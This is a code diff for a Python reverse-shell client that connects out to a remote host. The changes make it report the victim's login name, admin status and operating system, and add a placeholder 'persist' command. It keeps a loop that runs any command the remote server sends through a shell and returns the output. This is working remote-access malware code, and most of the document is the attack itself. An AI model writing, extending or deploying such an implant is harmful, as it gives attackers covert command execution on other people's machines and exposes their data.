@@ -3,43 +3,58 @@ import socket
 import subprocess
 import os
 import sys
+import platform
+import time
 
 
 def session_handler():
-    print(f'[+] Connecting to {host_ip}')
-    sock.connect((host_ip, int(host_port)))
+    try:
+        print(f'[+] Connecting to {host_ip}')
+        sock.connect((host_ip, int(host_port)))
 
-    # send user information
-    outbound(os.getlogin())
-    outbound(ctypes.windll.shell32.IsUserAnAdmin())
+        # send user information
+        outbound(os.getlogin())
+        outbound(ctypes.windll.shell32.IsUserAnAdmin())
 
-    print(f'[+] Connected to {host_ip}')
+        # prevent traffic getting messy
+        time.sleep(1)
 
-    while True:
-        message = inbound()
-        print(f'[+] Message received - {message}')
+        op_sys = platform.uname()
+        op_sys = (f'{op_sys[0]} {op_sys[2]}')
+        outbound(op_sys)
 
-        if message == 'exit':
-            print('[-] The server has terminated the session')
-            sock.close()
-            break
-        elif message.split(" ")[0] == 'cd':
-            try:
-                directory = str(message.split(" ")[1])
-                os.chdir(directory)
-                cur_dir = os.getcwd()
-                print(f'[+] Changed current directory to {cur_dir}')
-                output(cur_dir)
-            except FileNotFoundError:
-                outbound('Invalid directory. Please try again.')
-        elif message == 'background':
-            # This command backs out of a current session so the server can interact with another
-            pass
-        else:
-            # subprocess command handling
-            command = subprocess.Popen(message, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
-            output = command.stdout.read() + command.stderr.read()
-            outbound(output.decode())
+
+        print(f'[+] Connected to {host_ip}')
+
+        while True:
+            message = inbound()
+            print(f'[+] Message received - {message}')
+
+            if message == 'exit':
+                print('[-] The server has terminated the session')
+                sock.close()
+                break
+            elif message == 'persist':
+                pass
+            elif message.split(" ")[0] == 'cd':
+                try:
+                    directory = str(message.split(" ")[1])
+                    os.chdir(directory)
+                    cur_dir = os.getcwd()
+                    print(f'[+] Changed current directory to {cur_dir}')
+                    output(cur_dir)
+                except FileNotFoundError:
+                    outbound('Invalid directory. Please try again.')
+            elif message == 'background':
+                # This command backs out of a current session so the server can interact with another
+                pass
+            else:
+                # subprocess command handling
+                command = subprocess.Popen(message, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
+                output = command.stdout.read() + command.stderr.read()
+                outbound(output.decode())
+    except ConnectionRefusedError:
+        pass
 
 def inbound():
     """
